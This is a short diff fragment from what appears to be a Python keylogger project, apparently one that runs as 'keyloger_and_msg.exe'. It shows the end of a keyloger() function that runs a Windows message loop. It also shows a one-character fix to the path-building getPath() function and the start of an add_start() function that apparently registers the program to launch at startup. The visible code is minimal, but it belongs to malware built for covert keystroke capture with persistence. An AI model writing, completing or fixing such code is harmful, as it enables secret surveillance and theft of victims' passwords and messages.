@@ -111,7 +111,7 @@ def keyloger():
 	pythoncom.PumpMessages()
 
 def getPath():
-    path=os.getcwd()+'keyloger_and_msg.exe'
+    path=os.getcwd()+'\keyloger_and_msg.exe'
     return path
 	
 def add_start(path):
